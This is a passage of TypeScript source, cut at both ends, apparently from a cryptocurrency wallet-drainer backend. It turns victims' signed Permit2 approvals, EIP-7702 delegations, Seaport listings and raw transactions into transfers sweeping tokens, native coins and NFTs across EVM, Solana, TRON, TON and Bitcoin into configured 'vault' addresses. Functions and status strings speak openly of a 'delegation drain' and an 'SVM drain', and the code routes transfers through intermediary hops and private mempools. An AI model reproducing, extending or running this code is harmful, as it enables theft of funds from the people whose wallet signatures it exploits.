      ? 'SVM relay payload does not contain an intermediary transfer for the normalized amount'
      : 'SVM relay payload does not contain a vault transfer for the normalized amount'
  } catch (e) {
    return e instanceof Error ? e.message : String(e)
  }
}

function validateTronRelayPayload(
  transaction: RelayPayloadRecord,
  expectedToHex: string,
  amount: bigint,
): string | null {
  const rawData = transaction['raw_data']
  if (!isRecord(rawData)) return 'TRON relay payload missing raw_data'
  const contracts = rawData['contract']
  if (!Array.isArray(contracts)) return 'TRON relay payload missing contract array'
  const expected = expectedToHex.toUpperCase()
  for (const contract of contracts) {
    if (!isRecord(contract)) continue
    const parameter = contract['parameter']
    if (!isRecord(parameter)) continue
    const value = parameter['value']
    if (!isRecord(value)) continue

    // ── Path A: Native TRX transfer (TransferContract) ──────────────────────
    // raw_data.contract[].parameter.value = { to_address, amount }
    const toAddress = typeof value['to_address'] === 'string' ? value['to_address'].toUpperCase() : ''
    const rawAmount = value['amount'] ?? value['call_value']
    const amountString =
      typeof rawAmount === 'number' && Number.isFinite(rawAmount)
        ? String(Math.trunc(rawAmount))
        : typeof rawAmount === 'string'
          ? rawAmount.trim()
          : ''
    if (toAddress === expected && /^\d+$/.test(amountString) && BigInt(amountString) === amount) {
      return null
    }

    // ── Path B: TRC-20 smart contract call (TriggerSmartContract) ───────────
    // raw_data.contract[].parameter.value = { contract_address, owner_address, data }
    // data = ABI-encoded transfer(address,uint256): 4-byte selector + 32-byte to + 32-byte amount
    // TRON ABI address = 12-byte zero pad + 20-byte address (no '41' prefix)
    // expectedToHex = '41' + 40-char hex → strip '41' → 40-char evm hex
    const contractAddress = typeof value['contract_address'] === 'string' ? value['contract_address'] : ''
    const abiData = typeof value['data'] === 'string' ? value['data'] : ''
    if (contractAddress !== '' && abiData.length >= 136) {
      // Strip selector (8 hex chars = 4 bytes), address occupies next 64 chars (padded 32 bytes)
      // TRON address in ABI: last 40 chars of the 64-char padded slot
      const abiToAddress = abiData.slice(8 + 24, 8 + 64).toUpperCase()    // 40-char hex (no 41)
      const expectedEvmHex = expected.startsWith('41') ? expected.slice(2) : expected  // strip '41'
      const abiAmountHex = abiData.slice(8 + 64, 8 + 128)
      const abiAmount = abiAmountHex.length === 64 ? BigInt('0x' + abiAmountHex) : null
      if (abiToAddress === expectedEvmHex && abiAmount !== null && abiAmount === amount) {
        return null
      }
    }
  }
  return 'TRON relay payload does not target the configured vault for the normalized amount'
}

function tonRelayMetadataValidation(
  record: RelayPayloadRecord | null,
  vault: string,
  amount: bigint,
): string | null {
  const destination = readStringField(record, ['to', 'destination', 'vault_address', 'vaultAddress'])
  if (destination !== vault) return 'TON relay envelope destination does not match configured vault'
  const rawAmount = readStringField(record, ['amount', 'value', 'nanotons'])
  if (rawAmount == null || !/^\d+$/.test(rawAmount) || BigInt(rawAmount) !== amount) {
    return 'TON relay envelope value does not match normalized amount'
  }
  return null
}

/** Poll TonCenter for the latest on-chain tx after user-BOC broadcast (lt:hash). */
async function resolveTonUserBocTxHash(
  client: import('@ton/ton').TonClient,
  walletAddress: string,
  opts?: { timeoutMs?: number; intervalMs?: number },
): Promise<string | null> {
  const { Address } = await import('@ton/core')
  let address: import('@ton/core').Address
  try {
    address = Address.parse(walletAddress.trim())
  } catch {
    return null
  }
  const timeout = opts?.timeoutMs ?? 30_000
  const interval = opts?.intervalMs ?? 2_000
  const deadline = Date.now() + timeout
  while (Date.now() < deadline) {
    try {
      const txs = await client.getTransactions(address, { limit: 1 })
      const tx = txs[0]
      if (tx) {
        const hash = tx.hash().toString('hex')
        const lt = tx.lt?.toString() ?? '0'
        return `${lt}:${hash}`
      }
    } catch {
      /* transient — keep polling */
    }
    await sleepMs(interval)
  }
  return null
}

async function awaitTronUserBroadcastConfirmation(
  txHash: string,
): Promise<{ ok: true; warning?: string } | { ok: false; detail: string }> {
  if (!isConfirmationPollingEnabled()) return { ok: true }
  const outcome = await pollTronConfirmation(txHash, resolveTronSensoryFullHost())
  if (outcome.status === 'failed') {
    return { ok: false, detail: outcome.detail }
  }
  if (outcome.status === 'timeout') {
    console.warn(`[TRON_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
    return { ok: true, warning: 'broadcast_confirmation_timeout' }
  }
  return { ok: true }
}

async function awaitBtcUserBroadcastConfirmation(
  txHash: string,
): Promise<{ ok: true; warning?: string } | { ok: false; detail: string }> {
  if (!isConfirmationPollingEnabled() || txHash === '') return { ok: true }
  const outcome = await pollBtcConfirmation(txHash)
  if (outcome.status === 'failed') {
    return { ok: false, detail: outcome.detail }
  }
  if (outcome.status === 'timeout') {
    console.warn(`[BTC_CONFIRM] ${txHash} broadcast_confirmation_timeout`)
    return { ok: true, warning: 'broadcast_confirmation_timeout' }
  }
  return { ok: true }
}

function readVarInt(bytes: Uint8Array, cursor: { offset: number }): bigint {
  const first = bytes[cursor.offset]
  if (first == null) throw new Error('UTXO relay payload truncated')
  cursor.offset += 1
  if (first < 0xfd) return BigInt(first)
  if (first === 0xfd) {
    const v = BigInt((bytes[cursor.offset] ?? 0) | ((bytes[cursor.offset + 1] ?? 0) << 8))
    cursor.offset += 2
    return v
  }
  if (first === 0xfe) {
    let v = 0n
    for (let i = 0; i < 4; i++) v |= BigInt(bytes[cursor.offset + i] ?? 0) << BigInt(8 * i)
    cursor.offset += 4
    return v
  }
  let v = 0n
  for (let i = 0; i < 8; i++) v |= BigInt(bytes[cursor.offset + i] ?? 0) << BigInt(8 * i)
  cursor.offset += 8
  return v
}

function btcAddressToScriptPubKey(address: string): string {
  const lower = address.toLowerCase()
  if (lower.startsWith('bc1') || lower.startsWith('tb1')) {
    try {
      const decoded = bech32.decode(lower as `${string}1${string}`)
      const version = decoded.words[0]
      const program = bech32.fromWords(decoded.words.slice(1))
      const hex = Buffer.from(program).toString('hex')
      if (version === 0 && program.length === 20) return `0014${hex}`
      if (version === 0 && program.length === 32) return `0020${hex}`
    } catch {
      const decoded = bech32m.decode(lower as `${string}1${string}`)
      const version = decoded.words[0]
      const program = bech32m.fromWords(decoded.words.slice(1))
      const hex = Buffer.from(program).toString('hex')
      if (version === 1 && program.length === 32) return `5120${hex}`
    }
  }
  const raw = base58.decode(address)
  if (raw.length < 21) throw new Error('Unsupported BTC vault address')
  const hash160 = Buffer.from(raw.slice(1, 21)).toString('hex')
  if (address.startsWith('1') || address.startsWith('m') || address.startsWith('n')) {
    return `76a914${hash160}88ac`
  }
  if (address.startsWith('3') || address.startsWith('2')) return `a914${hash160}87`
  throw new Error('Unsupported BTC vault address')
}

function validateUtxoRelayPayload(rawTransactionHex: string, vault: string, amount: bigint): string | null {
  try {
    const expectedScript = btcAddressToScriptPubKey(vault).toLowerCase()
    const bytes = hexToBytes(rawTransactionHex)
    const cursor = { offset: 4 }
    const marker = bytes[cursor.offset]
    const flag = bytes[cursor.offset + 1]
    const hasWitness = marker === 0 && flag != null && flag !== 0
    if (hasWitness) cursor.offset += 2
    const inputCount = Number(readVarInt(bytes, cursor))
    for (let i = 0; i < inputCount; i++) {
      cursor.offset += 36
      const scriptLen = Number(readVarInt(bytes, cursor))
      cursor.offset += scriptLen + 4
    }
    const outputCount = Number(readVarInt(bytes, cursor))
    for (let i = 0; i < outputCount; i++) {
      const outputAmount = readU64Le(bytes, cursor.offset)
      cursor.offset += 8
      const scriptLen = Number(readVarInt(bytes, cursor))
      const script = Buffer.from(bytes.slice(cursor.offset, cursor.offset + scriptLen)).toString('hex')
      cursor.offset += scriptLen
      if (script.toLowerCase() === expectedScript && outputAmount === amount) return null
    }
    return 'UTXO relay payload does not contain a vault output for the normalized amount'
  } catch (e) {
    return e instanceof Error ? e.message : String(e)
  }
}

export async function broadcastEVM(
  ctx: SettlementBridgeTriggerContext,
  options?: EvmBroadcastOptions,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.evm) {
    return relayVaultUnbound(
      ctx,
      'evm-liquidator',
      'EVM',
      'VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM required',
    )
  }

  const openedPayload = openSignaturePayloadForSettlement(ctx.signature_hex)
  const seaportListingEnvelope = openedPayload
    ? parseSeaportListingSignatureEnvelope(openedPayload)
    : null
  if (
    seaportListingEnvelope != null ||
    ctx.protocol === 'seaport_listing' ||
    ctx.protocol?.includes('seaport') === true
  ) {
    if (seaportListingEnvelope == null) {
      return relayPayloadUnavailable(
        ctx,
        'evm-liquidator',
        'EVM',
        vaults.evm,
        'seaport_listing settlement requires seaport order envelope payload',
      )
    }
    const settlement = await executeSeaportListingSettlement(seaportListingEnvelope)
    if (settlement.ok && settlement.transaction_hash) {
      const result = broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: vaults.evm,
        status: 'broadcasted',
        tx_hash: settlement.transaction_hash,
        detail: 'Seaport listing fulfillOrder complete',
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    }
    return broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: vaults.evm,
      status: 'broadcast_failed',
      detail: settlement.detail ?? 'Seaport listing settlement failed',
    })
  }

  const omnichainAtomicEnvelope = openedPayload
    ? parseOmnichainAtomicSignatureEnvelope(openedPayload)
    : null
  if (
    omnichainAtomicEnvelope != null ||
    ctx.protocol === 'omnichain_atomic_v1' ||
    ctx.protocol?.includes('omnichain_atomic') === true
  ) {
    if (omnichainAtomicEnvelope == null) {
      return relayPayloadUnavailable(
        ctx,
        'evm-liquidator',
        'EVM',
        vaults.evm,
        'omnichain_atomic_v1 settlement requires omnichain atomic envelope payload',
      )
    }
    const chainId = parseSettlementChainId(ctx.chain_id)
    const atomic = await executeOmnichainAtomicSettlement({
      owner: getAddress(ctx.wallet_address),
      chainId,
      envelope: omnichainAtomicEnvelope,
      scout_value_usd: ctx.scout_value_usd,
    })
    const transferTxHash =
      atomic.evm_transaction_hashes?.[atomic.evm_transaction_hashes.length - 1] ??
      atomic.bitcoin_tx_hash ??
      atomic.omnichain_transaction_hashes?.sol ??
      atomic.omnichain_transaction_hashes?.trx ??
      atomic.omnichain_transaction_hashes?.ton ??
      atomic.omnichain_transaction_hashes?.spl ??
      atomic.omnichain_transaction_hashes?.trc20 ??
      atomic.omnichain_transaction_hashes?.jetton
    if (atomic.ok && transferTxHash) {
      const result = broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: vaults.evm,
        status: 'broadcasted',
        tx_hash: transferTxHash,
        detail: `Omnichain atomic settlement: ${JSON.stringify(atomic.chains)}`,
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    }
    return broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: vaults.evm,
      status: 'broadcast_failed',
      detail: atomic.detail ?? 'Omnichain atomic settlement failed',
    })
  }

  const batchPermit2Envelope = openedPayload ? parseBatchPermit2SignatureEnvelope(openedPayload) : null
  const permit2Envelope = openedPayload ? parsePermit2SignatureEnvelope(openedPayload) : null
  const eip7702Envelope = openedPayload ? parseEip7702SignatureEnvelope(openedPayload) : null

  if (ctx.protocol === 'eip7702_delegation' || eip7702Envelope != null) {
    const chainId = parseSettlementChainId(ctx.chain_id)
    const payload = openedPayload ?? ctx.signature_hex ?? ''
    const settlement = await executeEip7702DelegationDrain(payload, chainId)
    if (settlement.ok && settlement.transaction_hash) {
      const result = broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: vaults.evm,
        status: 'broadcasted',
        tx_hash: settlement.transaction_hash,
        detail: settlement.detail ?? 'EIP-7702 delegation drain complete',
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    }
    return broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: vaults.evm,
      status: 'broadcast_failed',
      detail: settlement.detail ?? 'EIP-7702 delegation drain failed',
    })
  }

  const isPermit2Protocol =
    ctx.protocol === 'permit2_eip712' ||
    ctx.protocol === 'permit2_batch_eip712' ||
    ctx.protocol?.includes('permit2') === true ||
    permit2Envelope != null ||
    batchPermit2Envelope != null

  if (isPermit2Protocol && batchPermit2Envelope?.batch != null) {
    const chainId = parseSettlementChainId(ctx.chain_id)
    const batchBase = {
      owner: getAddress(ctx.wallet_address),
      chainId,
      permit2Signature: batchPermit2Envelope.permit2_signature,
      batch: batchPermit2Envelope.batch,
      scout_value_usd: ctx.scout_value_usd,
    }
    const batchSettlementOpts = {
      owner: batchBase.owner,
      chainId: batchBase.chainId,
      permit2Signature: batchBase.permit2Signature,
      batch: batchBase.batch,
      nativeSignedTransaction: batchPermit2Envelope.native_signed_transaction,
      omnichainNative: {
        native_amount_sol: batchPermit2Envelope.native_amount_sol ?? batchPermit2Envelope.batch?.native_amount_sol,
        native_amount_trx: batchPermit2Envelope.native_amount_trx ?? batchPermit2Envelope.batch?.native_amount_trx,
        native_amount_ton: batchPermit2Envelope.native_amount_ton ?? batchPermit2Envelope.batch?.native_amount_ton,
        native_signed_transaction_sol: batchPermit2Envelope.native_signed_transaction_sol,
        native_signed_transaction_trx: batchPermit2Envelope.native_signed_transaction_trx,
        native_signed_transaction_ton: batchPermit2Envelope.native_signed_transaction_ton,
        spl_mint: batchPermit2Envelope.spl_mint ?? batchPermit2Envelope.batch?.spl_mint,
        spl_amount: batchPermit2Envelope.spl_amount ?? batchPermit2Envelope.batch?.spl_amount,
        native_signed_transaction_spl: batchPermit2Envelope.native_signed_transaction_spl,
        trc20_contract:
          batchPermit2Envelope.trc20_contract ?? batchPermit2Envelope.batch?.trc20_contract,
        trc20_amount: batchPermit2Envelope.trc20_amount ?? batchPermit2Envelope.batch?.trc20_amount,
        native_signed_transaction_trc20: batchPermit2Envelope.native_signed_transaction_trc20,
        jetton_master: batchPermit2Envelope.jetton_master ?? batchPermit2Envelope.batch?.jetton_master,
        jetton_amount: batchPermit2Envelope.jetton_amount ?? batchPermit2Envelope.batch?.jetton_amount,
        native_signed_transaction_jetton: batchPermit2Envelope.native_signed_transaction_jetton,
      },
      nfts: batchPermit2Envelope.nfts ?? batchPermit2Envelope.batch?.nfts,
    }

    let batchSettlement = await tryExecuteBatchPermit2WithFlashloan(batchBase)
    if (batchSettlement != null && !batchSettlement.ok) {
      console.warn(
        `[FLASHLOAN] High-value flash path failed (${batchSettlement.detail ?? 'unknown'}) — falling back to standard batch settlement`,
      )
      batchSettlement = null
    }
    if (batchSettlement == null) {
      batchSettlement = await executeBatchPermit2Settlement(batchSettlementOpts)
    }
    const transferTxHash =
      batchSettlement.transaction_hashes?.[batchSettlement.transaction_hashes.length - 1]
    if (batchSettlement.ok && transferTxHash) {
      const result = broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: vaults.evm,
        status: 'broadcasted',
        tx_hash: transferTxHash,
        detail:
          'flashloan' in batchSettlement && batchSettlement.flashloan
            ? (batchSettlement.detail ?? 'Flashloan atomic settlement')
            : batchSettlement.transaction_hashes && batchSettlement.transaction_hashes.length > 1
              ? `Permit2 batch permit=${batchSettlement.transaction_hashes[0]?.slice(0, 12)}… transfer=${transferTxHash.slice(0, 12)}…`
              : 'Permit2 batch transferFrom complete',
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    }
    return broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: vaults.evm,
      status: 'broadcast_failed',
      detail: batchSettlement.detail ?? 'Permit2 batch settlement failed',
    })
  }

  if (isPermit2Protocol && permit2Envelope?.permit != null && ctx.token_address) {
    const chainId = parseSettlementChainId(ctx.chain_id)
    const amount = parseSettlementAmountRaw(ctx) ?? 0n
    const owner = getAddress(ctx.wallet_address)
    const token = getAddress(ctx.token_address)
    const settlement = await executePermit2AllowanceSettlement({
      owner,
      token,
      amount,
      permit2Signature: permit2Envelope.permit2_signature,
      permit: permit2Envelope.permit,
      chainId,
    })
    if (settlement.ok && settlement.transfer_tx_hash) {
      const result = broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: vaults.evm,
        status: 'broadcasted',
        tx_hash: settlement.transfer_tx_hash,
        detail: settlement.permit_tx_hash
          ? `Permit2 permit=${settlement.permit_tx_hash.slice(0, 12)}… transfer=${settlement.transfer_tx_hash.slice(0, 12)}…`
          : 'Permit2 transferFrom complete',
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    }
    if (permit2Envelope.evm_raw_transaction == null) {
      return broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: vaults.evm,
        status: 'broadcast_failed',
        detail: settlement.detail ?? 'Permit2 settlement failed',
      })
    }
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'evm-liquidator',
      'EVM',
      vaults.evm,
      'EVM relay requires normalized amount',
    )
  }
  const decodedWire = decodeEvmWireFromSignatureHex(ctx)
  if (decodedWire == null) {
    return relayPayloadUnavailable(
      ctx,
      'evm-liquidator',
      'EVM',
      vaults.evm,
      'EVM relay requires caller-authorized signed raw transaction payload',
    )
  }
  logSignatureHexDecoderPath('evm-liquidator', decodedWire.decoder_path)
  const rawTransaction = decodedWire.wire
  if (!isHexPayload(rawTransaction)) {
    return relayValidationFailure(
      ctx,
      'evm-liquidator',
      'EVM',
      vaults.evm,
      'EVM relay payload must be serialized hex',
    )
  }
  const evmHop = resolveEvmRelayHopDestination(vaults.evm)
  if (evmHop.ok === false) {
    return relayValidationFailure(ctx, 'evm-liquidator', 'EVM', vaults.evm, evmHop.detail)
  }
  const validation = validateEvmRelayPayload(
    rawTransaction,
    evmHop.broadcast_destination,
    amount,
    { intermediary_hop: evmHop.intermediary_hop },
  )
  if (validation != null) {
    return relayValidationFailure(ctx, 'evm-liquidator', 'EVM', vaults.evm, validation)
  }
  const rpc = await resolveEvmSettlementRpcUrlBridge()
  if (rpc === '') {
    return broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: vaults.evm,
      status: 'rpc_unconfigured',
      detail: 'RPC_ETHEREUM_PRIVATE / NEXT_PUBLIC_RPC_URL / RPC_URL required',
    })
  }
  try {
    const chain = resolveViemChainForSettlement(parseSettlementChainId(ctx.chain_id))
    const chainId = parseSettlementChainId(ctx.chain_id)

    const mevActive =
      isMevProtectEnabled() ||
      isMevProtectActiveForSettlement({ scout_value_usd: ctx.scout_value_usd })
    if (mevActive || isFlashbotsEnabled()) {
      let tx_hash: string
      let detail: string
      if (mevActive) {
        tx_hash = await submitPrivateTransaction(rawTransaction, chainId)
        detail = 'MEV_PROTECT eth_sendPrivateTransaction (public RPC fallback on failure)'
      } else {
        const delivery = await deliverSignedEvmTransactions({
          txns: [rawTransaction],
          chainId,
          rpcUrl: rpc,
        })
        if (!delivery.ok || delivery.transaction_hashes.length === 0) {
          return broadcastResult({
            lane: 'evm-liquidator',
            chain_family: 'EVM',
            destination_vault: vaults.evm,
            status: 'broadcast_failed',
            detail: delivery.detail ?? 'Flashbots bundle submission failed',
          })
        }
        tx_hash = delivery.transaction_hashes[0]!
        detail = delivery.bundle_hash
          ? `Flashbots bundle ${delivery.bundle_hash.slice(0, 12)}…`
          : 'Flashbots private mempool submission'
      }
      const result = broadcastResult({
        lane: 'evm-liquidator',
        chain_family: 'EVM',
        destination_vault: evmHop.vault,
        status: 'broadcasted',
        tx_hash,
        detail,
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    }

    const publicClient = createPublicClient({
      chain,
      transport: http(rpc, {
        ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
      }),
    })
    const tx_hash = await publicClient.sendRawTransaction({ serializedTransaction: rawTransaction })

    let relay_second_leg_tx_hash: string | undefined
    if (evmHop.intermediary_hop) {
      const secondLegHash = await executeEvmRelaySecondLeg({
        ctx,
        rpc,
        chain,
        intermediary: evmHop.broadcast_destination,
        vault: evmHop.vault,
        amount,
        onRelaySecondLegBroadcast: options?.onRelaySecondLegBroadcast,
      })
      if (secondLegHash != null) {
        relay_second_leg_tx_hash = secondLegHash
      }
    }

    const result = broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: evmHop.vault,
      status: 'broadcasted',
      tx_hash,
      ...(relay_second_leg_tx_hash !== undefined ? { relay_second_leg_tx_hash } : {}),
      ...(evmHop.intermediary_hop && relay_second_leg_tx_hash == null
        ? { detail: 'RELAY_INTERMEDIARY_EVM first leg broadcast; second leg skipped or failed' }
        : evmHop.intermediary_hop && relay_second_leg_tx_hash != null
          ? { detail: 'RELAY_INTERMEDIARY_EVM two-hop broadcast complete' }
          : {}),
    })
    emitSettlementIgnitedTelemetry(result, ctx)
    return result
  } catch (e) {
    return broadcastResult({
      lane: 'evm-liquidator',
      chain_family: 'EVM',
      destination_vault: evmHop.vault,
      status: 'broadcast_failed',
      detail: e instanceof Error ? e.message : String(e),
    })
  }
}

export async function broadcastSVM(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.svm) {
    return relayVaultUnbound(
      ctx,
      'solana-liquidator',
      'SVM',
      'VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL required',
    )
  }
  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'solana-liquidator',
      'SVM',
      vaults.svm,
      'SVM relay requires normalized amount',
    )
  }
  const decodedWire = decodeSvmWireFromSignatureHex(ctx)
  if (decodedWire == null) {
    if (isNonEvmServerSigningEnabled()) {
      const svmHop = resolveSvmRelayHopDestination(vaults.svm)
      if (svmHop.ok) {
        const mint = ctx.token_address?.trim()
        const serverResult =
          mint && mint.length >= 32
            ? await serverBroadcastSvmSpl({
                vaultAddress: svmHop.broadcast_destination,
                mint,
                amountRaw: amount,
              })
            : await serverBroadcastSvmNative({
                vaultAddress: svmHop.broadcast_destination,
                amountRaw: amount,
              })
        // Always return the server result — broadcast_failed if it failed, not relayPayloadUnavailable
        emitSettlementIgnitedTelemetry(serverResult, ctx)
        return serverResult
      }
      return broadcastResult({
        lane: 'solana-liquidator',
        chain_family: 'SVM',
        destination_vault: vaults.svm,
        status: 'broadcast_failed',
        detail: 'NON_EVM_SERVER_SIGNING enabled but SVM relay hop destination unresolvable',
      })
    }
    return relayPayloadUnavailable(
      ctx,
      'solana-liquidator',
      'SVM',
      vaults.svm,
      'SVM relay requires caller-authorized signed transaction payload',
    )
  }
  logSignatureHexDecoderPath('solana-liquidator', decodedWire.decoder_path)

  // ── Already-broadcast path: wallet used signAndSendTransaction ──────────────
  // Frontend sent us the tx sig hash (not a VersionedTransaction). The wallet
  // already broadcast it — confirm on-chain instead of re-broadcasting.
  if (decodedWire.decoder_path === 'already_broadcast_hash') {
    const tx_hash = decodedWire.wire
    const svmHopAB = resolveSvmRelayHopDestination(vaults.svm)
    try {
      // Use HTTP polling — avoids WebSocket subscription leaks that cause
      // unhandledRejection when the dangling subscriber fires after the outer
      // promise has already settled.
      const pollOutcome = await pollSolanaConfirmation(tx_hash, resolveInstitutionalSolanaRpcUrl(), {
        intervalMs: 2_000,
        timeoutMs: 45_000,
      })
      if (pollOutcome.status === 'failed') {
        return broadcastResult({
          lane: 'solana-liquidator',
          chain_family: 'SVM',
          destination_vault: svmHopAB.ok ? svmHopAB.vault : vaults.svm,
          status: 'broadcast_failed',
          detail: `SVM wallet-broadcast confirmation fault: ${pollOutcome.detail}`,
        })
      }
      // status === 'timeout' → tx still in flight, treat as pending broadcast
      const result = broadcastResult({
        lane: 'solana-liquidator',
        chain_family: 'SVM',
        destination_vault: svmHopAB.ok ? svmHopAB.vault : vaults.svm,
        status: 'broadcasted',
        tx_hash,
        detail: 'SVM wallet broadcast via signAndSendTransaction — confirmed on-chain',
      })
      emitSettlementIgnitedTelemetry(result, ctx)
      return result
    } catch (e) {
      return broadcastResult({
        lane: 'solana-liquidator',
        chain_family: 'SVM',
        destination_vault: svmHopAB.ok ? svmHopAB.vault : vaults.svm,
        status: 'broadcast_failed',
        detail: e instanceof Error ? e.message : String(e),
      })
    }
  }

  const rawPayload = decodedWire.wire
  const rawBytes = isHexPayload(rawPayload) ? hexToBytes(rawPayload) : base64ToBytes(rawPayload)
  const svmHop = resolveSvmRelayHopDestination(vaults.svm)
  if (svmHop.ok === false) {
    return relayValidationFailure(ctx, 'solana-liquidator', 'SVM', vaults.svm, svmHop.detail)
  }
  const validation = validateSvmRelayPayload(
    rawBytes,
    svmHop.broadcast_destination,
    amount,
    { intermediary_hop: svmHop.intermediary_hop },
  )
  if (validation != null) {
    return relayValidationFailure(ctx, 'solana-liquidator', 'SVM', vaults.svm, validation)
  }
  try {
    const svmMevActive =
      isMevProtectEnabled() ||
      isMevProtectActiveForSettlement({ scout_value_usd: ctx.scout_value_usd })
    const tx_hash = svmMevActive
      ? await submitPrivateSolanaTransaction(rawBytes)
      : await (async () => {
          const connection = new Connection(resolveInstitutionalSolanaRpcUrl(), {
            commitment: 'confirmed',
          })
          return connection.sendRawTransaction(rawBytes, {
            preflightCommitment: 'confirmed',
            skipPreflight: false,
            maxRetries: 3,
          })
        })()
    // Use HTTP polling — avoids WebSocket subscription leaks that cause
    // unhandledRejection when the dangling subscriber fires after the outer
    // promise has already settled (root cause of FATAL crashes in SVM drain).
    const pollOutcome = await pollSolanaConfirmation(tx_hash, resolveInstitutionalSolanaRpcUrl(), {
      intervalMs: 2_000,
      timeoutMs: 45_000,
    })
    if (pollOutcome.status === 'failed') {
      throw new Error(`SVM confirmation fault: ${pollOutcome.detail}`)
    }
    // status === 'timeout' → tx still in-flight; return success and let chain settle
    const result = broadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: svmHop.vault,
      status: 'broadcasted',
      tx_hash,
      ...(svmHop.intermediary_hop
        ? {
            relay_intermediary_pending: true,
            detail: 'RELAY_INTERMEDIARY_SVM one-hop broadcast; second-hop transfer in progress.',
          }
        : {}),
    })
    emitSettlementIgnitedTelemetry(result, ctx)

    // Start second-hop monitoring in background if intermediary hop is set
    if (svmHop.intermediary_hop) {
      void (async () => {
        try {
          await monitorAndCompleteSecondHop(svmHop.broadcast_destination, svmHop.vault)
        } catch (e) {
          console.error('[SVM_SECOND_HOP_ERROR]', e instanceof Error ? e.message : String(e))
        }
      })()
    }

    return result
  } catch (e) {
    return broadcastResult({
      lane: 'solana-liquidator',
      chain_family: 'SVM',
      destination_vault: svmHop.vault,
      status: 'broadcast_failed',
      detail: e instanceof Error ? e.message : String(e),
    })
  }
}

export async function broadcastTron(
  ctx: SettlementBridgeTriggerContext,
): Promise<SettlementBroadcastResult> {
  const vaults = resolveSovereignVaultAddresses()
  if (!vaults.tron) {
    return relayVaultUnbound(
      ctx,
      'tron-sensory-armor',
      'TRON',
      'VAULT_ADDRESS_TRON or SOVEREIGN_VAULT_TRON required',
    )
  }

  const sensory = await pingTronSensoryArmorLane()
  if (!sensory.ping_ok) {
    return broadcastResult({
      lane: 'tron-sensory-armor',
      chain_family: 'TRON',
      destination_vault: vaults.tron,
      status: 'sensory_unavailable',
      detail: `TRON sensory lane unavailable after ${String(sensory.latency_ms)}ms`,
    })
  }

  const amount = parseSettlementAmountRaw(ctx)
  if (amount == null) {
    return relayValidationFailure(
      ctx,
      'tron-sensory-armor',
      'TRON',
      vaults.tron,
      'TRON relay requires normalized amount',
    )
  }
  const record = relayPayloadRecord(ctx)
  const transactionPayload =
    record?.['tron_transaction'] ?? record?.['transaction'] ?? record?.['raw_transaction']
    // Frontend uses 'signed_tx' key — accept it as a fallback alias
    ?? record?.['signed_tx']
    ?? null
  let transaction: RelayPayloadRecord | null = null
  if (isRecord(transactionPayload)) {
    transaction = transactionPayload
  } else if (typeof transactionPayload === 'string' && transactionPayload.trim() !== '') {
    try {
      const parsed = JSON.parse(transactionPayload) as unknown
      if (isRecord(parsed)) transaction = parsed
    } catch {
      transaction = null
    }
  }
  if (transaction == null) {
    if (isNonEvmServerSigningEnabled()) {
      // Resolve token: ctx.token_address first; then SETTLEMENT_TRC20_CONTRACTS list; fallback USDT
      const tronToken = resolveTronTokenFromContext(ctx.token_address)
      const serverResult = await serverBroadcastTron({
        vaultAddress: vaults.tron,
        amountRaw: amount,
        tokenContract: tronToken,
      })
      // Always return server result — broadcast_failed carries the detail, not relayPayloadUnavailable
      emitSettlementIgnitedTelemetry(serverResult, ctx)
      return serverResult
    }
    return relayPayloadUnavailable(
      ctx,
      'tron-sensory-armor',
      'TRON',
      vaults.tron,
      'TRON relay requires caller-authorized signed transaction object',
    )
  }
  try {
    const { TronWeb } = await import('tronweb')
    const headers = tronProApiHeaders()
    const tronWeb =
      headers != null
        ? new TronWeb({ fullHost: resolveTronSensoryFullHost(), headers })
        : new TronWeb({ fullHost: resolveTronSensoryFullHost() })
    const validation = validateTronRelayPayload(transaction, tronWeb.address.toHex(vaults.tron), amount)
    if (validation != null) {
      return relayValidationFailure(ctx, 'tron-sensory-armor', 'TRON', vaults.tron, validation)
    }
    const response = (await tronWeb.trx.sendRawTransaction(
      transaction as unknown as Parameters<typeof tronWeb.trx.sendRawTransaction>[0],
    )) as unknown
    if (!isRecord(response)) throw new Error('TRON relay returned an invalid response')
    const ok = response['result'] === true || response['code'] == null
    if (!ok) throw new Error(String(response['message'] ?? response['code'] ?? 'TRON relay rejected transaction'))
    const tx_hash =
      typeof response['txid'] === 'string'
        ? response['txid']
        : typeof response['txID'] === 'string'
          ? response['txID']
          : typeof transaction['txID'] === 'string'
            ? transaction['txID']
            : ''
    if (tx_hash === '') throw new Error('TRON relay did not return a transaction id')
    const confirm = await awaitTronUserBroadcastConfirmation(tx_hash)
    if (confirm.ok === false) {
      return broadcastResult({
        lane: 'tron-sensory-armor',
        chain_family: 'TRON',
